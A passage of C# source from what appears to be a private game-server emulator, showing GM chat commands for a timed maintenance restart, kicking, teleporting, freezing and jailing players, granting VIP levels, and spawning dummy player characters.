                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (3 Minutes & 30 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (3 Minutes & 00 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                  MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 3minute0second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
              
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (3 Minutes & 00 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (2 Minutes & 30 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                  MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 2minute30second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
              
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (2 Minutes & 30 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (2 Minutes & 00 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                        MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 2minute0second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
         
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (2 Minutes & 00 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (1 Minutes & 30 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                   MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 1minute30second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
             
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (1 Minutes & 30 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (1 Minutes & 00 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                 MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 1minute0second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
               
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (1 Minutes & 00 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 30);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MyConsole.WriteLine("The server will be brought down for maintenance in (0 Minutes & 30 Seconds). Please log off immediately to avoid data loss.");
#if Arabic
                MsgMessage msg = new MsgMessage("The server will be brought down for maintenance in 0minute30second. Please exit the game now.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
                
#else
                                MsgMessage msgs = new MsgMessage("The server will be brought down for maintenance in (0 Minutes & 30 Seconds). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 20);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
#if Arabic
                  MsgMessage msg = new MsgMessage("Server maintenance(2 minutes). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);
              
#else
                                MsgMessage msgs = new MsgMessage("Server maintenance(few minutes). Please log off immediately to avoid data loss.", "ALLUSERS", "GM", MsgMessage.MsgColor.red, MsgMessage.ChatMode.Center);

#endif
                                Program.SendGlobalPackets.Enqueue(msgs.GetArray(stream));
                            }
                            System.Threading.Thread.Sleep(1000 * 10);
                            Program.ProcessConsoleEvent(0);
                            Database.Server.SaveDatabase();
                            if (Database.Server.FullLoading && !Program.ServerConfig.IsInterServer)
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.OnInterServer)
                                        continue;
                                    if ((user.ClientFlag & Client.ServerFlag.LoginFull) == Client.ServerFlag.LoginFull)
                                    {
                                        user.ClientFlag |= Client.ServerFlag.QueuesSave;
                                        Database.ServerDatabase.LoginQueue.TryEnqueue(user);
                                    }
                                }
                                MyConsole.WriteLine("Database got saved ! ");
                            }
                            if (Database.ServerDatabase.LoginQueue.Finish())
                            {
                                System.Threading.Thread.Sleep(500);
                                MyConsole.WriteLine("Database saved successfully.");
                            }
                            Program.ProcessConsoleEvent(0);

                            System.Diagnostics.Process hproces = new System.Diagnostics.Process();
                            hproces.StartInfo.FileName = "DeathWish.exe";
                            hproces.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
                            hproces.Start();

                            Environment.Exit(0); break;
                        }
                    case "kick":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Socket.Disconnect();
                                    break;
                                }
                            }
                            break;
                        }
                    case "rev":
                    case "revive":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Player.Revive(rec.GetStream());

                            break;
                        }
                    case "online":
                        {
                            client.SendSysMesage("Online Players : " + Database.Server.GamePoll.Count + " ", ChatMode.System);
                            client.SendSysMesage("Online Players : " + Database.Server.GamePoll.Count + " ");
                            break;
                        }
                    case "teeee":
                        {
                            client.Player.MyJiangHu.GetReward(client
                                );
                            break;
                        }
                    case "vip":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {

                                    user.Player.VipLevel = (byte)uint.Parse(data[2]);
                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var stream = rec.GetStream();
                                        user.Player.SendUpdate(stream, user.Player.VipLevel, MsgUpdate.DataType.VIPLevel);

                                        user.Player.UpdateVip(stream);
                                    }
                                    user.CreateBoxDialog("You`ve received vip6 (30 days) . Thank for you donation.");

                                    break;
                                }
                            }
                            break;
                        }

                    case "info":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name.ToLower() == data[1].ToLower())
                                    {

                                        client.Send(new MsgMessage("[Info" + user.Player.Name + "]", MsgColor.yellow, ChatMode.FirstRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("UID = " + user.Player.UID + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("IP = " + user.Socket.RemoteIp + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("ConquerPoints = " + user.Player.ConquerPoints + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("Money = " + user.Player.Money + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("Map = " + user.Player.Map + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("X = " + user.Player.X + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("Y = " + user.Player.Y + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        client.Send(new MsgMessage("BattlePower = " + user.Player.BattlePower + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                        break;
                                    }
                                }
                            }
                            break;
                        }
                    case "scroll":
                        {
                            switch (data[1].ToLower())
                            {
                                case "tc": client.Teleport(352, 319, 1002); break;
                                case "pc": client.Teleport(195, 260, 1011); break;
                                case "ac":
                                case "am": client.Teleport(566, 563, 1020); break;
                                case "dc": client.Teleport(500, 645, 1000); break;
                                case "bi": client.Teleport(723, 573, 1015); break;
                                case "pka": client.Teleport(050, 050, 1005); break;
                                case "ma": client.Teleport(211, 196, 1036); break;
                                case "ja": client.Teleport(100, 100, 6000); break;
                            }
                            break;
                        }
                    case "trace":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower().Contains(data[1].ToLower()))
                                {
                                    client.Teleport(user.Player.X, user.Player.Y, user.Player.Map, user.Player.DynamicID);
                                    break;
                                }
                            }

                            break;
                        }
                    case "bring":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Teleport(client.Player.X, client.Player.Y, client.Player.Map);
                                    break;
                                }
                            }
                            break;
                        }
                    case "freeze":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.AddFlag(MsgUpdate.Flags.Freeze, 60000, true);
                                    break;
                                }
                            }
                            break;
                        }

                    case "dizzy":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.AddFlag(MsgUpdate.Flags.Dizzy, 60000, true);
                                    break;
                                }
                            }
                            break;
                        }
                    case "addtop":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.AddFlag((MsgServer.MsgUpdate.Flags)int.Parse(data[2]), Role.StatusFlagsBigVector32.PermanentFlag, false);
                                    break;
                                }
                            }
                            break;
                        }
                    case "remtop":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.RemoveFlag((MsgServer.MsgUpdate.Flags)int.Parse(data[2]));
                                    break;
                                }
                            }
                            break;
                        }
                    case "autohunt":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    var rec = new ServerSockets.RecycledPacket();
                                    var stream = rec.GetStream();
                                    user.Send(stream.AutoHuntCreate(0, 341));
                                    user.Send(stream.AutoHuntCreate(1, 341));
                                    user.Player.OnAutoHunt = true;
                                    user.Player.AutoHuntExp = 0;
                                    break;
                                }
                            }
                            break;
                        }
                    case "kill":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.Dead(null, user.Player.X, user.Player.Y, 0);
                                    break;
                                }
                            }
                            break;
                        }

                    case "rfreeze":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.RemoveFlag(MsgUpdate.Flags.Freeze);

                                    break;
                                }
                            }
                            break;
                        }
                    case "rdizzy":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Player.RemoveFlag(MsgUpdate.Flags.Dizzy);

                                    break;
                                }
                            }
                            break;
                        }
                    case "arrest":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    user.Teleport(50, 50, 6004);
                                    user.BotJailCount += 1;
                                    string Messaje = "" + user.Player.Name + " Has Been Sent To BotJail, because was found using programs that are illegal in game (" + data[2].ToLower() + ").";
                                    Game.MsgServer.MsgMessage message = new MsgMessage(Messaje, MsgMessage.MsgColor.red, MsgMessage.ChatMode.BroadcastMessage);
                                    break;
                                }
                            }
                            break;
                        }
                    case "ab3t":
                        {
                            foreach (var user in Database.Server.GamePoll.Values)
                            {
                                if (user.Player.Name.ToLower() == data[1].ToLower())
                                {
                                    uint mapid = 0;
                                    if (!uint.TryParse(data[2], out mapid))
                                    {
                                        client.SendSysMesage("Invlid Map ID !");
                                        break;
                                    }
                                    ushort X = 0;
                                    if (!ushort.TryParse(data[3], out X))
                                    {
                                        client.SendSysMesage("Invlid X !");
                                        break;
                                    }
                                    ushort Y = 0;
                                    if (!ushort.TryParse(data[4], out Y))
                                    {
                                        client.SendSysMesage("Invlid Y !");
                                        break;
                                    }
                                    uint DinamicID = 0;
                                    if (!uint.TryParse(data[5], out DinamicID))
                                    {
                                        client.SendSysMesage("Invlid DinamicID !");
                                        break;
                                    }
                                    user.Teleport(X, Y, (ushort)mapid, DinamicID);
                                    break;
                                }
                            }
                            break;
                        }
                    case "arenapoints":
                        {
                            client.HonorPoints = uint.Parse(data[1]);
                            break;
                        }
                    case "staticrole":
                        {
                            var staticrole = new Role.StaticRole(client.Player.X, client.Player.Y);
                            staticrole.Map = client.Player.Map;

                            client.Map.AddStaticRole(staticrole);
                            break;
                        }
                    case "facke1":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "PIKA[Help-No " + i.ToString() + "]";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.Face = 153;
                                    pclient.Player.GarmentId = 195665;
                                    pclient.Player.Hair = client.Player.Hair;
                                    pclient.Player.HairColor = client.Player.HairColor;
                                    pclient.Player.RightWeaponId = client.Player.RightWeaponId;
                                    pclient.Player.LeftWeaponId = client.Player.LeftWeaponId;
                                    pclient.Player.LeftWeaponAccessoryId = 360435;
                                    pclient.Player.RightWeaponAccessoryId = 360435;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;
                                    pclient.Team = new Role.Instance.Team(pclient);
                                    pclient.Team.AddLider();
                                    pclient.Team.Add(stream, pclient);
                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "facke2":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "Mega" + i.ToString() + "";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;

                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    //case "check":
                    //    {
                    //        var target = Database.Server.GamePoll.Values.Where(p => p.Player.Name.ToLower() == data[1].ToLower()).FirstOrDefault();
                    //        if (target != null)
                    //            target.Send(GuardShield.MsgGuardShield.RequestOpenedProcesses());
                    //        break;
                    //    }
                    case "facke3":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "TheMan" + i.ToString() + "";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;

                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "facke4":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "Archer" + i.ToString() + "";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;

                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "facke5":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "Hunt" + i.ToString() + "";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;

                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "facke6":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++)
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = "Was3Yala" + i.ToString() + "";
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;

                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "spawnperson":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int i = 0; i < ushort.Parse(data[1]); i++) //kam wa7d
                                {
                                    Client.GameClient pclient = new Client.GameClient(null);
                                    pclient.Fake = true;

                                    pclient.Player = new Role.Player(pclient);
                                    //  pclient.Inventory = new Role.Instance.Inventory(pclient);
                                    pclient.Equipment = new Role.Instance.Equip(pclient);
                                    pclient.Warehouse = new Role.Instance.Warehouse(pclient);
                                    pclient.MyProfs = new Role.Instance.Proficiency(pclient);
                                    pclient.MySpells = new Role.Instance.Spell(pclient);
                                    pclient.Achievement = new Database.AchievementCollection();
                                    pclient.Status = new MsgStatus();

                                    pclient.Player.Name = data[2].ToLower();
                                    pclient.Player.Body = client.Player.Body;
                                    pclient.Player.Avatar = client.Player.Avatar;
                                    pclient.Player.GuildID = client.Player.GuildID;
                                    pclient.Player.Action = client.Player.Action;
                                    pclient.Player.UID = Database.Server.ClientCounter.Next;
                                    pclient.Player.HitPoints = client.Player.HitPoints;
                                    pclient.Status.MaxHitpoints = client.Status.MaxHitpoints;
                                    pclient.Player.RightWeaponId = client.Player.RightWeaponId;
                                    pclient.Player.LeftWeaponId = client.Player.LeftWeaponId;
                                    pclient.Player.ArmorId = client.Player.ArmorId;
                                    ushort x = client.Player.X;
                                    ushort y = client.Player.Y;
                                    pclient.Player.X = (ushort)Program.GetRandom.Next((int)x - 7, x + 7);
                                    pclient.Player.Y = (ushort)Program.GetRandom.Next((int)y - 7, y + 7);
                                    pclient.Player.Map = client.Player.Map;
                                    pclient.Player.Level = client.Player.Level;
                                    pclient.Player.ServerID = (ushort)Database.GroupServerList.MyServerInfo.ID;
                                    client.Send(pclient.Player.GetArray(stream, false));

                                    pclient.Map = client.Map;
                                    pclient.Map.Enquer(pclient);
                                    Database.Server.GamePoll.TryAdd(pclient.Player.UID, pclient);
                                }
                            }
                            break;
                        }
                    case "testepic":
                        {

                            client.Player.RightWeaponId = 671013;
                            client.Player.LeftWeaponId = 670013;


                            break;
                        }
                    case "dragonwar":
                        {
                            Game.MsgTournaments.MsgSchedules.Tournaments[MsgTournaments.TournamentType.DragonWar].Open();
                            break;
                        }

                    case "dis":
                        {
                            Game.MsgTournaments.MsgSchedules.DisCity.Open();
                            break;
                        }
                    case "testmoob":
                        {
                            if (client.Map.ContainMobID(uint.Parse(data[1])))
                                break;
                            using (var rec = new ServerSockets.RecycledPacket())
                                Database.Server.AddMapMonster(rec.GetStream(), client.Map, uint.Parse(data[1]), client.Player.X, client.Player.Y, ushort.Parse(data[2]), ushort.Parse(data[3]), byte.Parse(data[4]));
                            break;
                        }
                    case "onlineminutes":
                        {
                            client.Player.OnlineMinutes = uint.Parse(data[1]);
                            break;
                        }
                    case "addsouls":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                List<string> Items = new List<string>();

                                var array = Database.ItemType.PurificationItems[ushort.Parse(data[1])].Values.ToArray();
                                for (int x = 0; x < array.Length; x++)
                                {
                                    Items.Add(array[x].Name + " " + array[x].ID);
                                    client.Inventory.Add(stream, array[x].ID);
                                }
                                Database.DBActions.Write writer = new Database.DBActions.Write("Souls" + ushort.Parse(data[1]) + ".ini");
                                foreach (var it in Items)
                                    writer.Add(it);
                                writer.Execute(Database.DBActions.Mode.Open);
                            }
                            break;
                        }
                    case "addrefinary":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                List<string> Items = new List<string>();

                                var array = Database.ItemType.Refinary[ushort.Parse(data[1])].Values.ToArray();
                                for (int x = 0; x < array.Length; x++)
                                {
                                    Items.Add(array[x].Name + " " + array[x].ItemID);
                                    client.Inventory.Add(stream, array[x].ItemID);
                                }
                                Database.DBActions.Write writer = new Database.DBActions.Write("Souls" + ushort.Parse(data[1]) + ".ini");
                                foreach (var it in Items)
                                    writer.Add(it);
                                writer.Execute(Database.DBActions.Mode.Open);
                            }
                            break;
                        }
                    case "statue":
                        {
                            //  Role.Statue.ElitePkStatue(client);
                            Role.Statue.CreateStatue(client, client.Player.X, client.Player.Y, (int)client.Player.Action, 0, false);
                            break;
                        }
                    case "XS":
                        {
                            client.Status.Defence = 999999;
                            client.Status.MaxAttack = 9999999;
                            client.Status.MinAttack = 999999;
                            break;
                        }
                    case "HP":
                        {
                            client.Status.MaxHitpoints = 99999999;
                            break;
                        }
                    case "haire":
                        {
                            client.Player.Hair = ushort.Parse(data[1]); using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendUpdate(stream, client.Player.Hair, MsgUpdate.DataType.HairStyle);
                            }
                            break;
                        }
                    case "mapstat":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
